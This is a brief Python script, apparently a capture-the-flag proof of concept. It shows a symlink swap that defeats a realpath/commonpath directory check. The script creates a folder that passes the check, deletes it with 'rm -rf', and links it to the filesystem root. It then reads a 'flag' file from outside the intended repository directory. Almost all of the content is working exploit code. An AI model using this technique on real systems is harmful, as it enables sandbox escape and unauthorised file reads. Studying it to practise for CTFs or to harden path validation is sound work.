#!/usr/bin/python3 -u
import sys
import os
import os.path
import subprocess
import urllib.parse

_BASE_DIR = "/srv/ctf/gctf/"
_REPO_DIR = os.path.join("/srv/ctf/gctf/", "qwe")


def encode_repo_url(repo_url):
  return urllib.parse.quote(repo_url, safe='').replace('.', '%2e')


def build_repo_dir(repo_url):
  return os.path.join(_BASE_DIR, encode_repo_url(repo_url))

filepath = "cwd/flag"
dirpath = "."

# 1. add qwer folder.
os.popen("rm -rf qwer; mkdir -p qwer/").read()

subdir = "qwer/"
dirpath = os.path.normpath(os.path.join(dirpath, subdir))
print(dirpath)
real_dirpath = os.path.realpath(os.path.join(_REPO_DIR, dirpath))
if _REPO_DIR != os.path.commonpath((_REPO_DIR, real_dirpath)):
    print("NO...")
os.chdir(dirpath)
print("Changed Path")

# w2. e can fetch by git fetch.. anyways,
print(os.popen("rm -rf /srv/ctf/gctf/qwe/qwer; ln -s / /srv/ctf/gctf/qwe/qwer").read())

print("=================")
print(os.popen("ls -la .").read())
print(os.popen("ls -la /srv/ctf/gctf/qwe/").read())
print(os.popen("pwd").read())
print("=================")

real_filepath = os.path.realpath(os.path.join(_REPO_DIR, filepath))
print("real_filepath: " + real_filepath)
print("common_path: " + os.path.commonpath((_REPO_DIR, real_filepath)))
print(_REPO_DIR != os.path.commonpath((_REPO_DIR, real_filepath)))
print(subprocess.run(["cat", real_filepath], capture_output=True))
